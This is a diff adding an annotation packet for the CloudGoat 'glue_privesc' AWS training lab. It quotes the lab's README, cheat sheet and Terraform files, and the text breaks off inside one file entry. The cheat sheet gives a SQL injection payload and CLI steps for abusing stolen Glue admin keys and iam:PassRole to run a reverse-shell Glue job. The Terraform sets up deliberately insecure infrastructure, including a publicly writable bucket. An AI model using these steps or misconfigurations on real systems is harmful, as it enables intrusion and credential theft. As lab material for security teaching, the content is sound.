@@ -1,0 +1,214 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "ec5c0b24b7292522084391ee78937f5f2a7b67412e48866cdb4aa4cba3dd68cf",
+  "case_id": "cloudgoat:aws:glue_privesc",
+  "role": "primary",
+  "annotator_id": "annotator_01",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:glue_privesc",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "glue_privesc",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/cheat_sheet.md"
+    ],
+    "terraform_file_count": 13,
+    "has_cheat_sheet": true,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/",
+    "review_score": 62,
+    "independence_group": "cloudgoat-scenario:glue_privesc",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/README.md",
+      "member_sha256": "22687f1e4dc7976c12d865a1c161922db85578daf6c1fcb0fbb440537f7489c1",
+      "bytes": 2294,
+      "content_kind": "md",
+      "text": "# Scenario : Glue_privesc\n\n**Size:** Large\n\n**Difficulty:** Moderate\n\n**Command:** `$ ./cloudgoat.py create glue_privesc`\n\n## Scenario Resources\n\n- 1 VPC with:\n    - S3  x 1\n    - RDS x1\n    - EC2 x1\n    - Glue service\n- Lambda x1\n- SSM parameter Store\n- IAM Users x 2\n\n## Scenario Start(s)\n\nWeb address\n\n## Scenario Goal(s)\n\nFind a secret string stored in the ssm parameter store\n\n## Summary\n\nThere is an environment that is implemented as shown in the schematic drawing below. Glue service manager will accidentally upload their access keys through the web page. The manager hurriedly deleted the key from s3, but does not recognize that the key was stored in the DB.\n\nFind the manager's key and access the ssm parameter store with a vulnerable permission to find the parameter value named “flag”.\n\n> *Note*: The web page and the glue ETL job used in this scenario require some latency. The web page requires 1 minute after applying, and Glue requires 3 minutes after uploading the file. If the data file is not applied properly, please wait a little longer!\n\n\n\n## Schematic drawing\n\n![Schematic drawing](assets/schematic.png)\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](assets/exploitation_route.png)\n\n## Route Walkthrough\n\n※ The attacker identifies the web page functionality first. When you upload a file, it is stored in a specific s3, and you can see that the data in that file is applied to the monitoring page.\n\n1. The attacker steals the Glue manager's access key and secret key through a SQL Injection attack on the web page.\n2. The attacker checks the policies and permissions of the exposed account to identify any vulnerable privileges. Through these privileges, the attacker discovers the ability to create and execute a job that can perform a reverse shell attack, enabling them to obtain the desired role simultaneously.\n3. List the roles to use \"iam:passrole,\" write the reverse shell code, and insert this code file (.py) into S3 through the web page.\n4. In order to gain SSM access, Perform the creation of a Glue service job via AWS CLI, which also executes the reverse shell code.\n5. Execute the created job.\n6. Extract the value of “flag”(parameter name) from the ssm parameter store.\n\n**A cheat sheet for this route is available [here](./cheat_sheet.md)**\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/cheat_sheet.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/cheat_sheet.md",
+      "member_sha256": "6e06c5e3654775835c54bae77fe475ea2a5b8d6440de699ad85f8467e7a21361",
+      "bytes": 1273,
+      "content_kind": "md",
+      "text": "1. Sql Injection attack using burp suite\n\n`' 1=1-- -`\n\n2. Check glue administrator information\n\n`aws configure --profile [glue_manager]`\n\n3. Username Verification\n\n`aws --profile [glue_manager] sts get-caller-identity`\n\n4. Check inline policies\n\n`aws --profile [glue_manager] iam list-user-policies --user-name [glue_username]`\n\n5. Read more about inline policies\n\n`aws --profile [glue_manager] iam get-user-policy --user-name [glue_username] --policy-name [inline_policy_name]`\n\n6. Check the bucket granted to the privilege\n\n`aws --profile [glue_manager] s3 ls s3://[bucket_name]`\n\n7. Listing roles for using iam:passrole\n\n`aws --profile [glue_manager] iam list-roles`\n\n8. Inquiry permissions for roles\n\n`aws --profile [glue_manager] iam list-attached-role-policies --role-name [role_name]`\n\n9. Uploading reverse shell code(rev.py) created on the webpage\n\n10. Create a glue job that executes reverse shell code\n\n`aws --profile [glue_manager] glue create-job --name [job_name] --role [role_arn] --command '{\"Name\":\"pythonshell\", \"PythonVersion\": \"3\", \"ScriptLocation\":\"s3://[bucket_name]/[reverse_shell_code_file]\"}'`\n\n11. Run a job\n\n`aws --profile [glue_manager] glue start-job-run --job-name [job_name]`\n\n12. Accessing SSM parameters\n\n`aws ssm get-parameter --name flag`\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/manifest.yml",
+      "member_sha256": "3bf29b44bbaa2f1e1abab3e7eb703a6779d5788ed6999c78c8caea84eced741b",
+      "bytes": 869,
+      "content_kind": "yml",
+      "text": "---\n# The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: glue_privesc\n# The name of the author(s), comma separated\n- author: Best of the Best 12th CGV Team(Yong Siwoo, Park Do Kyu, Park Seo Hyun, Jung Ho Shim, Chae Jinsoo)\n# The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 1.1\n# Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n        This scenario starts with a web page that uploads a CSV file and performs data visualization through the Glue service.\n        The attacker steals the credentials present on the webpage via a SQL injection attack and uploads a reverse shell to create a Glue Job to obtain the secret string\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 09-12-2024\n...",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/data.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/data.tf",
+      "member_sha256": "60f6050fb64e4951e3fbbb6e914f25379ac9cf39fba6bd9085569e7e6dde8076",
+      "bytes": 499,
+      "content_kind": "tf",
+      "text": "data \"aws_ami\" \"latest_amazon_linux\" {\n  most_recent = true\n\n  filter {\n    name   = \"name\"\n    values = [\"amzn2-ami-hvm-*-x86_64-gp2\"]\n  }\n\n  filter {\n    name   = \"virtualization-type\"\n    values = [\"hvm\"]\n  }\n\n  owners = [\"amazon\"]\n}\n\ndata \"archive_file\" \"flask_app\" {\n  type        = \"zip\"\n  output_path = \"lambda.zip\"\n  source_dir  = \"source/flask/\"\n}\n\ndata \"archive_file\" \"lambda\" {\n  type        = \"zip\"\n  source_file = \"source/s3_to_gluecatalog.py\"\n  output_path = \"s3_to_gluecatalog.zip\"\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/ec2.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/ec2.tf",
+      "member_sha256": "b686efeb4ebffc2cbf5314448368bd1887d212f7a41781c233dd084b16692ae2",
+      "bytes": 2806,
+      "content_kind": "tf",
+      "text": "resource \"aws_key_pair\" \"this\" {\n  key_name   = \"cg-ec2-key-pair-${var.cgid}\"\n  public_key = file(var.ssh_public_key)\n}\n\nresource \"aws_instance\" \"linux_ec2\" {\n  ami                         = data.aws_ami.latest_amazon_linux.id\n  instance_type               = \"t3.micro\"\n  iam_instance_profile        = aws_iam_instance_profile.ec2.name\n  subnet_id                   = aws_subnet.public_1.id\n  associate_public_ip_address = true\n\n  vpc_security_group_ids = [\n    aws_security_group.ec2.id\n  ]\n\n  key_name = aws_key_pair.this.key_name\n\n  root_block_device {\n    volume_type           = \"gp3\"\n    volume_size           = 8\n    delete_on_termination = true\n  }\n\n  provisioner \"file\" {\n    source      = data.archive_file.flask_app.output_path\n    destination = \"/home/ec2-user/flask_app.zip\"\n    connection {\n      type        = \"ssh\"\n      user        = \"ec2-user\"\n      private_key = file(var.ssh_private_key)\n      host        = self.public_ip\n    }\n  }\n\n  provisioner \"file\" {\n    content = templatefile(\"${path.module}/source/sql_template.tpl\", {\n      csv_content           = file(\"source/order_data.csv\"), #data.local_file.csv_file.content,\n      aws_access_key_id     = aws_iam_access_key.glue_admin_access_key.id,\n      aws_secret_access_key = aws_iam_access_key.glue_admin_access_key.secret\n    })\n\n    destination = \"/home/ec2-user/insert_data.sql\"\n\n    connection {\n      type        = \"ssh\"\n      user        = \"ec2-user\"\n      private_key = file(var.ssh_private_key)\n      host        = self.public_ip\n    }\n  }\n\n  user_data = <<-EOF\n        #!/bin/bash\n\n        echo 'AWS_ACCESS_KEY_ID=${aws_iam_access_key.glue_web_access_key.id}' >> /etc/profile.d/cloudgoat.sh\n        echo 'AWS_SECRET_ACCESS_KEY=${aws_iam_access_key.glue_web_access_key.secret}' >> /etc/profile.d/cloudgoat.sh\n        echo 'AWS_RDS=${aws_db_instance.rds.endpoint}' >> /etc/profile.d/cloudgoat.sh\n        echo 'AWS_S3_BUCKET=${aws_s3_bucket.web.id}' >> /etc/profile.d/cloudgoat.sh\n        echo 'AWS_DEFAULT_REGION=${var.region}' >> /etc/profile.d/cloudgoat.sh\n\n        yum update -y\n        yum install -y python3 python3-pip\n        amazon-linux-extras install -y postgresql14\n\n        psql postgresql://${aws_db_instance.rds.username}:${aws_db_instance.rds.password}@${aws_db_instance.rds.endpoint}/${aws_db_instance.rds.db_name} -f /home/ec2-user/insert_data.sql\n\n        cd /home/ec2-user\n        unzip flask_app.zip -d ./flask_app\n        cd flask_app\n\n        pip3 install -r requirements.txt\n\n        mv flask.service /etc/systemd/system/flask-app.service\n\n        systemctl daemon-reload\n        systemctl enable flask-app.service\n        systemctl start flask-app.service\n  EOF\n\n  volume_tags = {\n    Name = \"CloudGoat ${var.cgid} EC2 Instance Root Device\"\n  }\n\n  tags = {\n    Name = \"cg-linux-ec2-${var.cgid}\"\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/glue.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/glue.tf",
+      "member_sha256": "7b83fca09daeef0bfc9e9bfe09cf87e1ea6bd4cc88590e59566930a31296ac2f",
+      "bytes": 1458,
+      "content_kind": "tf",
+      "text": "resource \"aws_glue_connection\" \"this\" {\n  name        = \"test-connections\"\n  description = \"This Glue Connection is used to connect to the RDS database.\"\n\n  connection_type = \"JDBC\"\n\n  connection_properties = {\n    PASSWORD            = var.rds_username\n    USERNAME            = var.rds_password\n    JDBC_CONNECTION_URL = \"jdbc:postgresql://${aws_db_instance.rds.endpoint}/${var.rds_database_name}\"\n  }\n\n  physical_connection_requirements {\n    availability_zone      = \"${var.region}a\"\n    security_group_id_list = [aws_security_group.glue.id]\n    subnet_id              = aws_subnet.public_1.id\n  }\n}\n\nresource \"aws_glue_data_catalog_encryption_settings\" \"example\" {\n  data_catalog_encryption_settings {\n    connection_password_encryption {\n      return_connection_password_encrypted = false\n    }\n\n    encryption_at_rest {\n      catalog_encryption_mode = \"DISABLED\"\n    }\n  }\n}\n\n\nresource \"aws_glue_job\" \"glue_job\" {\n  name     = \"ETL_JOB\"\n  role_arn = aws_iam_role.glue_ETL_role.arn\n\n  command {\n    script_location = \"s3://${aws_s3_bucket.data.bucket}/${aws_s3_object.glue_script_file.key}\"\n    python_version  = \"3\"\n    name            = \"glueetl\"\n  }\n\n  default_arguments = {\n    \"--job-language\" = \"python\"\n    \"--job-type\"     = \"ETL\"\n  }\n\n  worker_type       = \"G.1X\"\n  number_of_workers = 10\n  glue_version      = \"4.0\"\n\n  connections = [aws_glue_connection.this.name] # 위에서 정의한 Glue 연결 사용\n\n  max_retries = 0\n\n  timeout = 3\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/iam.tf",
+      "member_sha256": "666d154c6fda6e509e3a6dc567ae8caec0e0f57b2e55810db42470804889279f",
+      "bytes": 4134,
+      "content_kind": "tf",
+      "text": "resource \"aws_iam_user\" \"glue_web\" {\n  name = \"cg-run-app-${var.cgid}\"\n}\n\nresource \"aws_iam_access_key\" \"glue_web_access_key\" {\n  user = aws_iam_user.glue_web.name\n}\n\nresource \"aws_iam_policy\" \"s3_put_policy\" {\n  name        = \"s3_put_policy\"\n  description = \"Policy for putting objects in S3 bucket\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Sid    = \"AllowS3Put\"\n        Effect = \"Allow\"\n        Action = [\n          \"s3:PutObject\",\n          \"s3:PutBucketPolicy\"\n        ]\n        Resource = aws_s3_bucket.web.arn\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_user_policy_attachment\" \"s3_put_object\" {\n  policy_arn = aws_iam_policy.s3_put_policy.arn\n  user       = aws_iam_user.glue_web.name\n}\n\nresource \"aws_iam_user_policy_attachment\" \"user_rds_full_access\" {\n  policy_arn = \"arn:aws:iam::aws:policy/AmazonRDSFullAccess\"\n  user       = aws_iam_user.glue_web.name\n}\n\n\nresource \"aws_iam_user\" \"glue_admin\" {\n  name = \"cg-glue-admin-${var.cgid}\"\n}\n\nresource \"aws_iam_user_policy\" \"glue_management_policy\" {\n  name = \"glue_management_policy\"\n  user = aws_iam_user.glue_admin.name\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Sid    = \"IAMGlueManagement\"\n        Effect = \"Allow\"\n        Action = [\n          \"glue:CreateJob\",\n          \"glue:CreateTrigger\",\n          \"glue:StartJobRun\",\n          \"glue:UpdateJob\",\n          \"iam:PassRole\",\n          \"iam:Get*\",\n          \"iam:List*\"\n        ]\n        Resource = \"*\"\n      },\n      {\n        Sid      = \"ListBucket\"\n        Effect   = \"Allow\"\n        Action   = \"s3:ListBucket\"\n        Resource = aws_s3_bucket.web.arn\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_access_key\" \"glue_admin_access_key\" {\n  user = aws_iam_user.glue_admin.name\n}\n\n\nresource \"aws_iam_role\" \"glue_ETL_role\" {\n  name        = \"glue_ETL_role\"\n  description = \"Role for Glue ETL jobs\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          Service = [\n            \"rds.amazonaws.com\",\n            \"glue.amazonaws.com\"\n          ]\n        }\n        Action = \"sts:AssumeRole\"\n      }\n    ]\n  })\n\n  managed_policy_arns = [\n    \"arn:aws:iam::aws:policy/AmazonRDSFullAccess\",\n    \"arn:aws:iam::aws:policy/AmazonS3FullAccess\",\n    \"arn:aws:iam::aws:policy/AWSGlueConsoleFullAccess\",\n    \"arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole\"\n  ]\n}\n\n\nresource \"aws_iam_role\" \"ssm_parameter_role\" {\n  name = \"ssm_parameter_role\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          Service = \"glue.amazonaws.com\"\n        }\n        Action = \"sts:AssumeRole\"\n      }\n    ]\n  })\n\n  managed_policy_arns = [\n    \"arn:aws:iam::aws:policy/AmazonS3FullAccess\",\n    \"arn:aws:iam::aws:policy/AmazonSSMFullAccess\"\n  ]\n}\n\n\nresource \"aws_iam_role\" \"s3_to_gluecatalog_lambda_role\" {\n  name        = \"s3_to_gluecatalog_lambda_role\"\n  description = \"Role for Lambda function that loads data into Glue Catalog\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          Service = \"lambda.amazonaws.com\"\n        }\n        Action = \"sts:AssumeRole\"\n      }\n    ]\n  })\n\n  managed_policy_arns = [\n    \"arn:aws:iam::aws:policy/AmazonS3FullAccess\",\n    \"arn:aws:iam::aws:policy/AWSGlueConsoleFullAccess\",\n    \"arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\"\n  ]\n}\n\n\nresource \"aws_iam_role\" \"ec2_role\" {\n  name        = \"cg-${var.scenario-name}-ec2-profile\"\n  description = \"Role for EC2 instance\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          Service = \"ec2.amazonaws.com\"\n        }\n        Action = \"sts:AssumeRole\"\n      }\n    ]\n  })\n\n  managed_policy_arns = [\n    \"arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore\"\n  ]\n}\n\nresource \"aws_iam_instance_profile\" \"ec2\" {\n  name = \"cg-${var.scenario-name}-${var.cgid}-ecs-agent\"\n  role = aws_iam_role.ec2_role.name\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/lambda.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/lambda.tf",
+      "member_sha256": "c6b1921494e3b6aa3cb25ce7c1a7fe3d31b5c8e32229bde67d501316ca215d9b",
+      "bytes": 1282,
+      "content_kind": "tf",
+      "text": "resource \"aws_lambda_function\" \"s3_to_gluecatalog\" {\n  function_name = \"s3_to_gluecatalog\"\n  description   = \"This lambda function is triggered by an S3 event and loads data into Glue Catalog\"\n  handler       = \"s3_to_gluecatalog.lambda_handler\"\n  role          = aws_iam_role.s3_to_gluecatalog_lambda_role.arn\n  runtime       = \"python3.12\"\n\n  filename         = data.archive_file.lambda.output_path\n  source_code_hash = data.archive_file.lambda.output_base64sha256\n\n  timeout = 180\n\n  environment {\n    variables = {\n      BUCKET_Scenario2 = aws_s3_bucket.web.id\n      BUCKET_Final     = aws_s3_bucket.data.id\n      JDBC_URL         = aws_glue_connection.this.connection_properties.JDBC_CONNECTION_URL\n    }\n  }\n}\n\nresource \"aws_s3_bucket_notification\" \"bucket_notification\" {\n  bucket = aws_s3_bucket.web.id\n\n  lambda_function {\n    lambda_function_arn = aws_lambda_function.s3_to_gluecatalog.arn\n    events              = [\"s3:ObjectCreated:*\"]\n  }\n\n  depends_on = [aws_lambda_permission.allow_bucket]\n}\n\nresource \"aws_lambda_permission\" \"allow_bucket\" {\n  statement_id  = \"s3-trigger-permission\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = aws_lambda_function.s3_to_gluecatalog.arn\n  principal     = \"s3.amazonaws.com\"\n  source_arn    = aws_s3_bucket.web.arn\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/outputs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/outputs.tf",
+      "member_sha256": "76d49f7efc6338c13231d09e88cce98c3f9ecb14233c65af494ca2204003db97",
+      "bytes": 132,
+      "content_kind": "tf",
+      "text": "output \"website_url\" {\n  description = \"The URL of the website\"\n  value       = \"http://${aws_instance.linux_ec2.public_ip}:5000\"\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/provider.tf",
+      "member_sha256": "51a14f858d9563aa79aa7bd850e6ff38252b2b75fdbecd528cee030b399cfc03",
+      "bytes": 407,
+      "content_kind": "tf",
+      "text": "terraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.0.0\"\n    }\n    archive = {\n      source  = \"hashicorp/archive\"\n      version = \">= 2.4\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/rds.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/rds.tf",
+      "member_sha256": "4549a7b070987f3669ce9d485a10247b0a668337dda52b5014e24e72cb047e09",
+      "bytes": 828,
+      "content_kind": "tf",
+      "text": "resource \"aws_db_instance\" \"rds\" {\n  allocated_storage    = 20\n  storage_type         = \"gp2\"\n  engine               = \"postgres\"\n  engine_version       = \"16.4\"\n  instance_class       = \"db.t3.micro\"\n  db_subnet_group_name = aws_db_subnet_group.this.id\n  db_name              = var.rds_database_name\n  username             = var.rds_username\n  password             = var.rds_password\n  parameter_group_name = \"default.postgres16\"\n  publicly_accessible  = false\n  skip_final_snapshot  = true\n\n  port = \"5432\"\n\n  storage_encrypted = true\n\n  vpc_security_group_ids = [\n    aws_security_group.rds.id\n  ]\n}\n\nresource \"aws_db_subnet_group\" \"this\" {\n  name        = \"cg-rds-subnet-group-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Subnet Group\"\n\n  subnet_ids = [\n    aws_subnet.private_1.id,\n    aws_subnet.private_2.id\n  ]\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/s3.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/s3.tf",
+      "member_sha256": "c95a39fd4533057bc1f5e80512393b25313009807686b81fefb38017704ad252",
+      "bytes": 1515,
+      "content_kind": "tf",
+      "text": "locals {\n  bucket_suffix = replace(var.cgid, \"/[^a-z0-9-.]/\", \"-\")\n}\n\n\nresource \"aws_s3_bucket\" \"data\" {\n  bucket        = \"cg-data-${local.bucket_suffix}\"\n  force_destroy = true\n}\n\nresource \"aws_s3_bucket_acl\" \"data_acl\" {\n  depends_on = [\n    aws_s3_bucket_ownership_controls.data_ownership\n  ]\n\n  bucket = aws_s3_bucket.data.id\n  acl    = \"private\"\n}\n\nresource \"aws_s3_bucket_ownership_controls\" \"data_ownership\" {\n  bucket = aws_s3_bucket.data.id\n  rule {\n    object_ownership = \"ObjectWriter\"\n  }\n}\n\nresource \"aws_s3_object\" \"glue_script_file\" {\n  bucket = aws_s3_bucket.data.id\n  key    = \"ETL_JOB.py\"\n  source = \"source/ETL_JOB.py\"\n}\n\n\nresource \"aws_s3_bucket\" \"web\" {\n  bucket        = \"cg-web-${local.bucket_suffix}\"\n  force_destroy = true\n}\n\nresource \"aws_s3_object\" \"primary_web_data\" {\n  bucket = aws_s3_bucket.web.id\n  key    = \"order_data2.csv\"\n  source = \"source/order_data.csv\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"access_block\" {\n  bucket = aws_s3_bucket.web.id\n\n  ignore_public_acls      = true\n  block_public_acls       = true\n  block_public_policy     = false\n  restrict_public_buckets = true\n}\n\nresource \"aws_s3_bucket_policy\" \"put_object\" {\n  depends_on = [\n    aws_s3_bucket_public_access_block.access_block\n  ]\n\n  bucket = aws_s3_bucket.web.id\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action    = \"s3:PutObject\"\n        Effect    = \"Allow\"\n        Resource  = \"${aws_s3_bucket.web.arn}/*\"\n        Principal = \"*\"\n      }\n    ]\n  })\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/security_groups.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/security_groups.tf",
+      "member_sha256": "48807267357f5ac815a96203cae4a0a02acfee5abc03f7a1fe51039f67991e3b",
+      "bytes": 1588,
+      "content_kind": "tf",
+      "text": "resource \"aws_security_group\" \"glue\" {\n  name        = \"cg-rds-glue-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for EC2 Instance over HTTP\"\n  vpc_id      = aws_vpc.vpc.id\n\n  ingress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  tags = {\n    Name = \"cg-rds-glue-${var.cgid}\"\n  }\n}\n\nresource \"aws_security_group\" \"ec2\" {\n  name        = \"cg-ec2-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for EC2 Instance over HTTP\"\n  vpc_id      = aws_vpc.vpc.id\n\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  ingress {\n    from_port   = 5000\n    to_port     = 5000\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  tags = {\n    Name = \"cg-ec2-${var.cgid}\"\n  }\n}\n\nresource \"aws_security_group\" \"rds\" {\n  name        = \"cg-rds-psql-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for PostgreSQL RDS Instance\"\n  vpc_id      = aws_vpc.vpc.id\n\n  ingress {\n    from_port   = 5432\n    to_port     = 5432\n    protocol    = \"tcp\"\n    cidr_blocks = concat([aws_vpc.vpc.cidr_block], var.cg_whitelist)\n  }\n\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n\n  tags = {\n    Name = \"cg-rds-psql-${var.cgid}\"\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/ssm_parameter.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/ssm_parameter.tf",
+      "member_sha256": "e8204c017f398c428fd255a9acc8056c1beadb91ce7e692d9722a3b6ab70bf60",
+      "bytes": 185,
+      "content_kind": "tf",
